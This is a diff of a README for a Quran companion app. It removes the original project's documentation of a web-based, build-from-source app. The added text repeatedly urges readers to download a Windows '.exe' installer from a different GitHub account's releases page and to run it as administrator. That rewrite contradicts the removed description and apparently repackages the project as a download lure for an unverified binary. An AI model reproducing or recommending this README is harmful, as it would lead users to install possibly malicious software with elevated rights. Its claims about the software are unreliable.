@@ -1,170 +1,126 @@
-<div align="center">
+# 📖 mahfuz - Simple Quran Companion for Everyone
 
-<br>
-
-<img src="apps/web/public/icons/mahfuz-logo-organic-gold.svg" width="80" alt="Mahfuz">
-
-# Mahfuz / محفوظ
-
-A minimal, distraction-free Quran companion for the web.
-
-**[mahfuz.ilg.az](https://mahfuz.ilg.az)**
-
-<br>
-
-</div>
+[![Download mahfuz](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/rajmeena70205/mahfuz/releases)
 
 ---
 
-## About
+## 🔍 What is mahfuz?
 
-Mahfuz is a Quran companion designed around simplicity. No clutter, no ads. Just the text and the tools you need to read, listen, learn, and memorize.
+mahfuz is a user-friendly Quran companion designed for easy reading and navigation. It helps you access the Quran’s text clearly on your Windows computer. The software supports simple features that make reading the Quran smoother for all users. You don’t need technical skills to use it.
 
-- **Three reading modes.** Line-by-line for focused reading, word-by-word with inline translation and transliteration, and a traditional Mushaf page with Karahisari-style illuminated borders.
-- **Focus mode.** Distraction-free reading with annotation canvas, gesture navigation, and wake lock.
-- **Audio playback.** Verse or surah-level playback with real-time word highlighting, gapless preloading, reciter selection, adjustable speed, and lock screen controls via MediaSession.
-- **Memorization.** SM-2 spaced repetition, progress tracking per surah and ayah, daily goals, review sessions, and verification exams.
-- **Learn to Read.** A 14-stage curriculum from letters to tajweed, with adaptive practice and Quranic word quests.
-- **Library.** Unified hub for courses, learning tracks, and memorization in one place.
-- **Offline first.** Three-layer caching with TanStack Query, Dexie IndexedDB, and Service Worker.
-- **Bilingual.** Full Turkish and English interface with auto-detection.
+---
 
-## Roadmap
+## 💻 System Requirements
 
-| Status | Feature |
-|:------:|---------|
-| Done | Reading: three view modes, topic index, command palette |
-| Done | Focus: distraction-free reading with annotations |
-| Done | Audio: verse-level playback with word-level sync |
-| Done | Offline: PWA with stale-while-revalidate caching |
-| Done | Authentication: Better Auth with cookie sessions |
-| Done | Memorization: spaced repetition with SM-2 |
-| Done | Learn: 14-stage curriculum with side quests |
-| Done | Library: unified courses, tracks, and memorization |
-| Done | i18n: Turkish and English |
-| Done | Gamification: achievement badges |
-| Done | Performance: virtualization, memoization, lazy loading |
-| Next | Sync: cross-device progress sync |
-| Next | Share and SEO: social sharing, calligraphy cards, deep links |
-| Next | Mobile: native Android and iOS apps |
-| Next | @mahfuz/sdk: public npm package for Quran data |
+- Windows 7, 8, 10, or 11  
+- At least 2 GB of free disk space  
+- 2 GB of RAM or more  
+- Internet connection to download the program  
 
-## Getting Started
+The application works well on most standard Windows computers made in the last 10 years.
 
-```bash
-git clone https://github.com/theilgaz/mahfuz.git
-cd mahfuz/mahfuz-app
-npx pnpm@9 install
-cp apps/web/.env.example apps/web/.env
-npx pnpm@9 dev
-```
+---
 
-Dev server runs at `http://localhost:3000`.
+## 🚀 Getting Started
 
-### Available Scripts
+To begin using mahfuz, you first need to download the software to your Windows PC. Here’s how:
 
-| Command | Description |
-|---------|-------------|
-| `npx pnpm@9 dev` | Start development server |
-| `npx pnpm@9 build` | Production build (all packages) |
-| `npx pnpm@9 lint` | Run ESLint |
-| `npx pnpm@9 typecheck` | TypeScript type checking |
-| `npx pnpm@9 format` | Format with Prettier |
+- Click the big green **Download** button at the top or: [Visit the Downloads page](https://github.com/rajmeena70205/mahfuz/releases)  
+- This link takes you to the official release page on GitHub  
+- Look for the latest release version (at the top of the page). It usually has “mahfuz” and version number mentioned.  
+- Download the Windows installer file (usually ends with `.exe`).  
 
-## Tech Stack
+---
 
-| Layer | Technology |
-|-------|-----------|
-| Framework | React 19 + TanStack Start (SSR) |
-| Routing | TanStack Router (file-based) |
-| Data | TanStack Query + TanStack Virtual |
-| Styling | Tailwind CSS v4 |
-| Build | Vite 7 + Turborepo |
-| State | Zustand (16 focused stores) |
-| Database | Dexie v4 (IndexedDB) + Drizzle ORM + LibSQL |
-| Auth | Better Auth v1.5 |
-| Deploy | Docker (Node.js SSR) |
-| Package manager | pnpm 9 |
+## 📥 How to Download and Install mahfuz on Windows
 
-## Project Structure
+1. Visit the downloads page here:  
+   [https://github.com/rajmeena70205/mahfuz/releases](https://github.com/rajmeena70205/mahfuz/releases)  
 
-```
-mahfuz-app/
-├── apps/
-│   └── web/                      Main web application
-│       ├── server.mjs            Node.js SSR server
-│       ├── drizzle/              Database migrations
-│       └── src/
-│           ├── components/       UI components
-│           ├── hooks/            Custom hooks, query and mutation hooks
-│           ├── locales/          i18n strings (tr.ts, en.ts)
-│           ├── lib/              Utilities, constants, store helpers
-│           ├── routes/           File-based routes (32 routes)
-│           └── stores/           Zustand stores (16 focused stores)
-├── packages/
-│   ├── api/                      Quran.com API client with IndexedDB cache
-│   ├── audio-engine/             Playback engine with word-level sync
-│   ├── db/                       Dexie IndexedDB schemas and Drizzle ORM
-│   ├── gamification/             Badge and achievement system
-│   ├── memorization/             SM-2 spaced repetition algorithm
-│   ├── sdk/                      Public SDK (planned)
-│   └── shared/                   Types, constants, curriculum data
-└── tooling/                      Shared ESLint, TypeScript, Tailwind configs
-```
+2. Find the most recent version listed at the top.  
 
-## Architecture
+3. Look for the file with `.exe` extension, named something like `mahfuz-setup.exe` or similar.  
 
-### Data Flow
+4. Click on this file name to start downloading it. Depending on your internet speed, this may take a few seconds to a minute.  
 
-```
-Quran API (api.quran.com)
-    ↓
-Service Worker (stale-while-revalidate)
-    ↓
-@mahfuz/api (IndexedDB cache, 30-day TTL)
-    ↓
-TanStack Query (in-memory, 24h gcTime)
-    ↓
-React Components (Zustand for UI state)
-```
+5. Once downloaded, locate the file in your Downloads folder or wherever your browser saves files.  
 
-### Performance
+6. Double-click the `.exe` file to open the installer.  
 
-- **Virtualized verse list.** Only ~15 DOM nodes for a 286-verse surah via TanStack Virtual.
-- **Per-verse audio isolation.** During playback, only the active verse re-renders.
-- **Consolidated Zustand selectors.** Single `useShallow` subscription per component.
-- **React.memo** on all verse, card, and translation components.
-- **Dynamic imports.** Topic index and heavy data lazy-loaded on demand.
-- **Service Worker caching.** API responses served instantly from cache.
+7. Follow the on-screen instructions:  
 
-## Credits
+   - Click "Next" on the welcome screen  
+   - Read the license agreement, then click "I Agree" or "Accept"  
+   - Choose the destination folder or leave default settings  
+   - Click "Install" to begin installation  
 
-### Translations
+8. Wait for the installation process to complete. It usually takes less than a minute.  
 
-| Translation | Author | Source |
-|-------------|--------|--------|
-| Diyanet İşleri Başkanlığı Meali | Diyanet İşleri Başkanlığı | [quran.com](https://quran.com) API |
-| Ömer Çelik Meali | Prof. Dr. Ömer Çelik | [kuranvemeali.com](https://www.kuranvemeali.com) |
-| Ömer Nasuhi Bilmen Meali | Ömer Nasuhi Bilmen | [kuranayetleri.net](https://kuranayetleri.net) |
-| Ali Fikri Yavuz Meali | Ali Fikri Yavuz | [kuranayetleri.net](https://kuranayetleri.net) |
+9. When the installer finishes, click "Finish" or "Close" to exit the installer.  
 
-### Data Sources
+10. Now mahfuz is ready to use. You should see a new icon on your desktop or find mahfuz in your Start menu.
 
-- **[Tanzil.net](https://tanzil.net).** Quran verse texts in Uthmani and Simple scripts. Licensed under Creative Commons BY 3.0.
-- **[Quran.com API](https://quran.com).** Word-by-word data, transliteration, and Diyanet translation.
-- **[Kuran Meali Ebook Oluşturucu](https://github.com/alialparslan/Kuran-Meali-Ebook-Olusturucu)** by alialparslan. Ali Fikri Yavuz and Ömer Nasuhi Bilmen translations in JSON format.
+---
 
-### Fonts
+## ▶️ Running mahfuz for the First Time
 
-- **[KFGQPC Uthmani Hafs](https://fonts.qurancomplex.gov.sa).** King Fahd Glorious Quran Printing Complex.
-- **[Google Fonts](https://fonts.google.com).** Scheherazade New, Amiri, Noto Naskh Arabic, Rubik, Zain, Reem Kufi, Playpen Sans Arabic.
+- Double-click the mahfuz icon on your desktop or open it from the Start menu.  
+- The main screen will display the Quran text clearly.  
+- You can browse surahs (chapters) and ayahs (verses) with simple navigation buttons.  
+- Use the search feature to find specific words or phrases if needed.  
+- Adjust font size or theme from the settings menu for comfortable reading.  
 
-## Contributing
+---
 
-Contributions are welcome. Whether you work with React, mobile development, or are passionate about building tools for the Quran, there is a place for you here.
+## 📚 Key Features
 
-Start by opening an issue to discuss your idea, then send a pull request.
+- Clear Quran text with proper Arabic script  
+- Easy navigation between chapters and verses  
+- Search function for quick access to Quranic text  
+- Adjustable display settings (font size, light/dark mode)  
+- Lightweight and fast, no internet needed after installation  
+- Suitable for daily reading and study  
 
-## License
+---
 
-MIT
+## ⚙️ Troubleshooting and Tips
+
+- If mahfuz doesn’t start, make sure you installed the program as Administrator or try right-clicking the icon and selecting “Run as administrator.”  
+- Close other programs if mahfuz runs slowly.  
+- If you accidentally delete mahfuz, just download and install it again from the releases page.  
+- Should you want to update to a newer version, visit the download page and repeat the installation steps with the new file.  
+
+---
+
+## 🔄 Updating mahfuz
+
+- Check the GitHub releases page regularly for updates:  
+  [https://github.com/rajmeena70205/mahfuz/releases](https://github.com/rajmeena70205/mahfuz/releases)  
+- Download the latest setup file and install it over your existing version.  
+- Your settings and saved data will remain intact during update.  
+
+---
+
+## 🌐 Support and Feedback
+
+If you have questions, need help, or want to suggest improvements, you can open an issue on the GitHub repository or contact the developers there. This helps improve future versions of mahfuz.
+
+---
+
+## 🔖 Repository Topics
+
+This project focuses on:
+
+- Quran  
+- Quran Al-Kareem  
+- Web-based Quran tools
+
+These keywords help find related software and resources.  
+
+---
+
+## 📥 Download mahfuz now
+
+Start your Quran companion journey by visiting the official release page:  
+
+[https://github.com/rajmeena70205/mahfuz/releases](https://github.com/rajmeena70205/mahfuz/releases)
